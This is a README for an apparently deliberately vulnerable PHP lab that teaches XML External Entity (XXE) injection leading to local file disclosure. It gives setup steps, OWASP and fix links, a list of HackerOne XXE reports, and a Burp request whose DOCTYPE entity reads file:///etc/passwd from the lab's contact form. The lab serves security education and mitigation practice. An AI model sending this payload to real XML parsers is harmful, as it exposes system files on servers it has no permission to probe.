# PHP-XXE-TO-LFI

Many older or poorly configured XML processors evaluate external entity references within XML documents. External entities can be used to disclose internal files using the file URI handler, internal file shares, internal port scanning, remote code execution, and denial of service attacks.

The main goal of this app is to discuss how **XXE** vulnerabilities can be exploited and to encourage developers to send secDevLabs Pull Requests on how they would mitigate these flaws.

## Owasp

 https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
 
 https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection

## SAST Tools : 

Find With SAST Tools : SonarQube Develpoer Plan

![Getting Started](1.png)


Find With SAST Tools : Snyk Team Plans


![Getting Started](2.png)


## Setup


    make install


Then simply visit [localhost:10004][App] ! 😆

## Payload 

```XML
<?xml version="1.0" encoding="UTF-8"?>
<contact>
    <name>TEST</name>
    <email>TEST@EXAMPLE.com</email>
    <subject>We TEST</subject>
    <message>I LOVE WATCHING YOUR SKILLS, MAN</message>
</contact>
```

## Attack

![Getting Started](3.png)

    
Burp Request : 


    POST /contact.php HTTP/1.1
    Host: localhost:10004
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:96.0) Gecko/20100101 Firefox/96.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: text/plain;charset=UTF-8
    Content-Length: 230
    Origin: http://localhost:10004
    Connection: close
    Referer: http://localhost:10004/
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin

    <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxezrp9j SYSTEM "file:///etc/passwd"> ]>
    <contact>
     <name>mvmm&xxezrp9j;</name>
     <email>ccc@gmail.com</email>
     <subject>aaacckj</subject>
     <message>undefined</message>
    </contact>


## Fix Guide :  

 https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
 
## Twitter & Facebook Contributor :
   
 https://www.linkedin.com/in/mohammad-hussein-namadi-775baa131/
 
 https://twitter.com/siavashvafshar
    
## Fix 

We encourage you to contribute to Project and Fix Codes

If you want to pull request please follow this :

CONTRIBUTION.md
   
## Top Report 
1. [XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx](https://hackerone.com/reports/500515) to Starbucks - 304 upvotes, $4000
2. [XXE on pulse.mail.ru](https://hackerone.com/reports/505947) to Mail.ru - 263 upvotes, $6000
3. [XXE on sms-be-vip.twitter.com in SXMP Processor](https://hackerone.com/reports/248668) to Twitter - 250 upvotes, $10080
4. [XXE on https://duckduckgo.com](https://hackerone.com/reports/483774) to DuckDuckGo - 208 upvotes, $0
5. [Phone Call to XXE via Interactive Voice Response](https://hackerone.com/reports/395296) to ██████ - 167 upvotes, $0
6. [Partial bypass of #483774 with Blind XXE on https://duckduckgo.com](https://hackerone.com/reports/486732) to DuckDuckGo - 151 upvotes, $0
7. [Multiple endpoints are vulnerable to XML External Entity injection (XXE) ](https://hackerone.com/reports/72272) to Pornhub - 135 upvotes, $2500
8. [XXE through injection of a payload in the XMP metadata of a JPEG file](https://hackerone.com/reports/836877) to Informatica - 128 upvotes, $0
9. [XXE Injection through SVG image upload leads to SSRF](https://hackerone.com/reports/897244) to Zivver - 110 upvotes, $0
10. [XXE in Site Audit function exposing file and directory contents](https://hackerone.com/reports/312543) to Semrush - 99 upvotes, $2000
11. [XXE in DoD website that may lead to RCE](https://hackerone.com/reports/227880) to U.S. Dept Of Defense - 89 upvotes, $0
12. [[RCE] Unserialize to XXE - file disclosure on ams.upload.pornhub.com](https://hackerone.com/reports/142562) to Pornhub - 88 upvotes, $10000
13. [Blind XXE via Powerpoint files](https://hackerone.com/reports/334488) to Open-Xchange - 86 upvotes, $2000
14. [blind XXE in autodiscover parser](https://hackerone.com/reports/315837) to Mail.ru - 70 upvotes, $5000
15. [LFI and SSRF via XXE in emblem editor](https://hackerone.com/reports/347139) to Rockstar Games - 68 upvotes, $1500
16. [Blind OOB XXE At "http://ubermovement.com/"](https://hackerone.com/reports/154096) to Uber - 55 upvotes, $500
17. [XXE на webdav.mail.ru -  PROPFIND/PROPPATCH](https://hackerone.com/reports/758978) to Mail.ru - 54 upvotes, $10000
18. [XXE on ██████████ by bypassing WAF ████](https://hackerone.com/reports/433996) to QIWI - 50 upvotes, $5000
19. [[rev-app.informatica.com] - XXE](https://hackerone.com/reports/105434) to Informatica - 44 upvotes, $0
20. [RCE via Local File Read -\> php unserialization-\> XXE -\> unpickling](https://hackerone.com/reports/415501) to h1-5411-CTF - 43 upvotes, $0
21. [XML External Entity (XXE) in qiwi.com + waf bypass](https://hackerone.com/reports/99279) to QIWI - 39 upvotes, $3137
22. [Authenticated XXE](https://hackerone.com/reports/1095645) to WordPress - 39 upvotes, $600
23. [XML Parser Bug: XXE over which leads to RCE](https://hackerone.com/reports/55431) to drchrono - 32 upvotes, $700
24. [XXE on DoD web server](https://hackerone.com/reports/188743) to U.S. Dept Of Defense - 30 upvotes, $0
25. [Singapore - XXE at https://www.starbucks.com.sg/RestApi/soap11](https://hackerone.com/reports/762251) to Starbucks - 27 upvotes, $500
26. [[app.informaticaondemand.com] XXE](https://hackerone.com/reports/105753) to Informatica - 24 upvotes, $0
27. [Blind XXE on my.mail.ru](https://hackerone.com/reports/276276) to Mail.ru - 23 upvotes, $800
28. [Non-production Open Database In Combination With XXE Leads To SSRF](https://hackerone.com/reports/742808) to Evernote - 23 upvotes, $0
29. [ XXE in upload file feature](https://hackerone.com/reports/105787) to Informatica - 21 upvotes, $0
30. [[send.qiwi.ru] Soap-based XXE vulnerability /soapserver/ ](https://hackerone.com/reports/36450) to QIWI - 17 upvotes, $1000
31. [Blind XXE on pu.vk.com](https://hackerone.com/reports/296622) to VK.com - 16 upvotes, $500
32. [XXE in the Connector Designer](https://hackerone.com/reports/112116) to Bime - 13 upvotes, $750
33. [[marketplace.informatica.com] - XXE](https://hackerone.com/reports/106797) to Informatica - 13 upvotes, $0
34. [AEM forms XXE Vulnerability](https://hackerone.com/reports/1321070) to Adobe - 13 upvotes, $0
35. [OOB XXE ](https://hackerone.com/reports/690387) to Mail.ru - 12 upvotes, $500
36. [blind XXE when uploading avatar in mymail phone app](https://hackerone.com/reports/277341) to Mail.ru - 11 upvotes, $1000
37. [XXE issue](https://hackerone.com/reports/130661) to Moneybird - 11 upvotes, $150
38. [[rev-app.informatica.com] - XXE via SAML](https://hackerone.com/reports/106865) to Informatica - 11 upvotes, $0
39. [[marketplace.informatica.com] - XXE](https://hackerone.com/reports/106802) to Informatica - 11 upvotes, $0
40. [h1-5411-CTF report: LFI / Deserialization / XXE vulnerability, ](https://hackerone.com/reports/415233) to h1-5411-CTF - 8 upvotes, $0
41. [[usuppliers.uber.com] - Server Side Request Forgery via XXE OOB](https://hackerone.com/reports/448598) to Uber - 7 upvotes, $500
42. [XXE крит](https://hackerone.com/reports/449627) to Mail.ru - 7 upvotes, $300
43. [XXE on www.publish.engelvoelkers.com](https://hackerone.com/reports/914801) to Engel & Völkers Technology GmbH - 7 upvotes, $0
44. [XXE in Enterprise Search's App Search web crawler](https://hackerone.com/reports/1156748) to Elastic - 6 upvotes, $8200
45. [[Java]: Add XXE sinks](https://hackerone.com/reports/1339787) to GitHub Security Lab - 6 upvotes, $1800
46. [XXE at Informatica sub-domain](https://hackerone.com/reports/150520) to Informatica - 6 upvotes, $0
47. [OOB XXE ](https://hackerone.com/reports/690295) to Mail.ru - 5 upvotes, $500
48. [XXE and SSRF on webmaster.mail.ru](https://hackerone.com/reports/12583) to Mail.ru - 3 upvotes, $700
49. [XXE in OAuth2 Applications gallery profile App logo](https://hackerone.com/reports/104620) to Coinbase - 2 upvotes, $0
50. [XXE at host vpn.owncloud.com](https://hackerone.com/reports/105980) to ownCloud - 2 upvotes, $0
51. [Pippo XML Entity Expansion (Billion Laughs Attack)](https://hackerone.com/reports/506791) to Central Security Project - 1 upvotes, $0

   
